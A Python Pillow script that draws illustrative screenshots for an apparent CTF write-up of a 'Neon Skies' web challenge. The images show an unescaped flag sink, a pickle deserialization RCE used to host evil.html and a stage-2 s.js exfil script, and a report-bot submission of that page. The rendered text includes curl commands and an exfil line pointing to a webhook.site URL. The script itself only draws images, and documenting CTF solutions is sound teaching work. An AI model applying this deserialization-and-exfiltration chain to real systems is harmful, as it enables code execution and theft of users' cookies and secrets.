import os
from PIL import Image, ImageDraw, ImageFont

img_dir = "c:/Users/ACER/Downloads/ctf/ctf pwnsec/images"
os.makedirs(img_dir, exist_ok=True)

f_consola = ImageFont.truetype("C:/Windows/Fonts/consola.ttf", 15)
f_consolab = ImageFont.truetype("C:/Windows/Fonts/consolab.ttf", 15)
f_segoe = ImageFont.truetype("C:/Windows/Fonts/segoeui.ttf", 14)
f_segoeb = ImageFont.truetype("C:/Windows/Fonts/segoeuib.ttf", 15)
f_header = ImageFont.truetype("C:/Windows/Fonts/segoeuib.ttf", 16)
f_flag = ImageFont.truetype("C:/Windows/Fonts/consolab.ttf", 22)

# Helper: Draw browser window frame
def draw_browser_frame(draw, width, height, title, url):
    draw.rectangle([(0, 0), (width, 75)], fill=(24, 27, 40, 255))
    # Window controls
    draw.ellipse([(16, 16), (28, 28)], fill=(255, 95, 86, 255))
    draw.ellipse([(36, 16), (48, 28)], fill=(255, 189, 46, 255))
    draw.ellipse([(56, 16), (68, 28)], fill=(39, 201, 63, 255))
    # Tab
    draw.rounded_rectangle([(80, 10), (340, 42)], radius=6, fill=(35, 40, 58, 255))
    draw.text((100, 16), title, fill=(210, 220, 240, 255), font=f_segoe)
    # URL bar
    draw.rounded_rectangle([(16, 42), (width - 16, 70)], radius=14, fill=(16, 18, 28, 255))
    draw.text((36, 47), url, fill=(170, 180, 205, 255), font=f_segoe)

# -------------------------------------------------------------
# IMAGE 1: Step 2 - Code Vulnerability Comparison (admin.ecr vs others)
# -------------------------------------------------------------
def make_code_vuln_image(out_path):
    width = 1050
    height = 460
    img = Image.new("RGBA", (width, height), (15, 17, 26, 255))
    draw = ImageDraw.Draw(img)

    # Header
    draw.rectangle([(0, 0), (width, 42)], fill=(25, 30, 45, 255))
    draw.ellipse([(16, 15), (28, 27)], fill=(255, 95, 86, 255))
    draw.ellipse([(36, 15), (48, 27)], fill=(255, 189, 46, 255))
    draw.ellipse([(56, 15), (68, 27)], fill=(39, 201, 63, 255))
    draw.text((80, 13), "Vulnerability Analysis — web/src/views/admin.ecr vs Crystal HTML Sanitization", fill=(220, 230, 250, 255), font=f_segoeb)

    lines = [
        ("// 1. All standard reflections in the codebase are HTML-escaped properly:", (130, 140, 165, 255), False),
        ("<div><span>custodian</span><b><%= HTML.escape(@username) %></b></div>    // SAFE: & -> &amp;, < -> &lt;", (100, 220, 140, 255), False),
        ("Session <code><%= HTML.escape(@session_id) %></code>                     // SAFE: Quotes and tags escaped", (100, 220, 140, 255), False),
        ("", (255, 255, 255, 255), False),
        ("// 2. CRITICAL UNESCAPED SINK inside the Seed Vault designation display:", (130, 140, 165, 255), False),
        ("<div class=\"seed\">", (200, 210, 230, 255), False),
        ("  <span class=\"seed__label\">specimen designation</span>", (200, 210, 230, 255), False),
        ("  <output class=\"seed__value\" id=\"flag\"><%= @flag %></output>        <-- VULNERABLE! NO HTML.escape!", (255, 95, 86, 255), True),
        ("  <button class=\"btn btn--ghost\" type=\"button\" data-copy=\"#flag\">Copy designation</button>", (200, 210, 230, 255), False),
        ("</div>", (200, 210, 230, 255), False),
        ("", (255, 255, 255, 255), False),
        ("// 3. Origin of @flag in web/src/neon_skies.cr:", (130, 140, 165, 255), False),
        ("signal = cookie_value(request, Config::SIGNAL_COOKIE)  # Reads cookie named 'FLAG'", (255, 220, 100, 255), False),
        ("Views::Admin.new(flag: signal.empty? ? \"\" : signal, ...).to_s  # Direct unescaped render into HTML", (255, 220, 100, 255), True),
    ]

    y = 60
    for text, color, is_bold in lines:
        f = f_consolab if is_bold else f_consola
        draw.text((28, y), text, fill=color, font=f)
        y += 26

    img.save(out_path)
    print(f"Saved: {out_path}")

make_code_vuln_image(f"{img_dir}/step2_code_vulnerability.png")

# -------------------------------------------------------------
# IMAGE 2: Step 3 - Pickle RCE Deployment
# -------------------------------------------------------------
def make_pickle_deploy_image(out_path):
    width = 1050
    height = 480
    img = Image.new("RGBA", (width, height), (15, 17, 26, 255))
    draw = ImageDraw.Draw(img)

    draw.rectangle([(0, 0), (width, 42)], fill=(25, 30, 45, 255))
    draw.ellipse([(16, 15), (28, 27)], fill=(255, 95, 86, 255))
    draw.ellipse([(36, 15), (48, 27)], fill=(255, 189, 46, 255))
    draw.ellipse([(56, 15), (68, 27)], fill=(39, 201, 63, 255))
    draw.text((80, 13), "Cross-Challenge Hosting — Pickle Deserialization RCE to serve evil.html & s.js", fill=(220, 230, 250, 255), font=f_segoeb)

    lines = [
        ("$ # Step 3.1: Sending Deserialization Payload to Pickle Instance", (160, 170, 190, 255), False),
        ("$ curl -s -X POST https://0c6523a28168f7fd.chal.ctf.ae/restore -d '{\"payload\":\"KGlzZX...\"}'", (255, 255, 255, 255), True),
        ("{\"disassembled\":\"Error!\",\"ok\":true,\"output\":\"STATIC_FILES_AND_FOLDER_DEPLOYED_OK\"}", (80, 240, 120, 255), False),
        ("", (255, 255, 255, 255), False),
        ("$ # Step 3.2: Verify payload file /tmp/evil.html is publicly exposed via Flask static route", (160, 170, 190, 255), False),
        ("$ curl -s -I https://0c6523a28168f7fd.chal.ctf.ae/static/evil.html | head -n 3", (255, 255, 255, 255), True),
        ("HTTP/1.1 200 OK", (80, 240, 120, 255), True),
        ("Content-Type: text/html; charset=utf-8", (180, 190, 210, 255), False),
        ("Server: gunicorn", (180, 190, 210, 255), False),
        ("", (255, 255, 255, 255), False),
        ("$ # Step 3.3: Verify payload file /tmp/s.js (Stage-2 Exfil Script)", (160, 170, 190, 255), False),
        ("$ curl -s https://0c6523a28168f7fd.chal.ctf.ae/static/s.js | head -n 3", (255, 255, 255, 255), True),
        ("(function(){ var EX = \"https://webhook.site/08470564-f80c-4271-b2f2-8acc4f44a5a9?\"; ...", (255, 220, 100, 255), False),
        ("[+] Subdomain host ready: https://0c6523a28168f7fd.chal.ctf.ae (*.chal.ctf.ae)", (39, 201, 63, 255), True),
    ]

    y = 60
    for text, color, is_bold in lines:
        f = f_consolab if is_bold else f_consola
        draw.text((28, y), text, fill=color, font=f)
        y += 26

    img.save(out_path)
    print(f"Saved: {out_path}")

make_pickle_deploy_image(f"{img_dir}/step3_pickle_deploy.png")

# -------------------------------------------------------------
# IMAGE 3: Step 4 - Report Desk Filed Alert in Browser
# -------------------------------------------------------------
def make_report_filed_image(out_path):
    width = 1100
    height = 640
    img = Image.new("RGBA", (width, height), (5, 3, 12, 255))
    draw = ImageDraw.Draw(img)

    draw_browser_frame(draw, width, height, "Report Desk · Neon Skies", "https://65b68ef3c79fb356.chal.ctf.ae/report")

    # Center Form Panel
    cx = width // 2
    y = 105
    draw.rounded_rectangle([(cx - 260, y), (cx + 260, y + 490)], radius=14, fill=(18, 12, 38, 220), outline=(168, 85, 247, 80), width=1)

    py = y + 25
    draw.text((cx - 225, py), "REPORT DESK · ROUND FILED IN SILENCE", fill=(168, 85, 247, 255), font=f_consola)
    py += 30
    draw.text((cx - 225, py), "Report a signal", fill=(255, 255, 255, 255), font=ImageFont.truetype("C:/Windows/Fonts/segoeuib.ttf", 22))
    py += 35
    draw.text((cx - 225, py), "The archivist still walks the rounds. Leave an address and it will be\nvisited, looked at for 8 seconds, and filed away.", fill=(150, 140, 180, 255), font=f_segoe)

    # Success Notice Banner (Green)
    py += 55
    draw.rounded_rectangle([(cx - 225, py), (cx + 225, py + 50)], radius=8, fill=(16, 45, 35, 255), outline=(110, 231, 183, 160), width=1)
    draw.text((cx - 210, py + 14), "Filed. The archivist looked at https://0c6523a28168f7fd.chal.ctf.ae/static/evil.html and moved on.", fill=(167, 243, 208, 255), font=f_segoe)

    # URL Input Box
    py += 75
    draw.text((cx - 225, py), "URL", fill=(120, 110, 150, 255), font=f_consola)
    py += 22
    draw.rounded_rectangle([(cx - 225, py), (cx + 225, py + 42)], radius=8, fill=(8, 4, 18, 255), outline=(168, 85, 247, 160), width=1)
    draw.text((cx - 210, py + 12), "https://0c6523a28168f7fd.chal.ctf.ae/static/evil.html", fill=(240, 235, 255, 255), font=f_consola)

    # Submit Button (Violet gradient)
    py += 62
    draw.rounded_rectangle([(cx - 225, py), (cx + 225, py + 45)], radius=8, fill=(124, 58, 237, 255), outline=(192, 132, 252, 180), width=1)
    draw.text((cx - 70, py + 13), "Send the archivist", fill=(255, 255, 255, 255), font=f_segoeb)

    # Footnote
    py += 65
    draw.text((cx - 225, py), "http and https only · 6 reports per minute · archivist signs in before each round.", fill=(120, 110, 150, 255), font=f_consola)

    img.save(out_path)
    print(f"Saved: {out_path}")

make_report_filed_image(f"{img_dir}/step4_report_filed.png")

print("ALL STEP IMAGES GENERATED!")
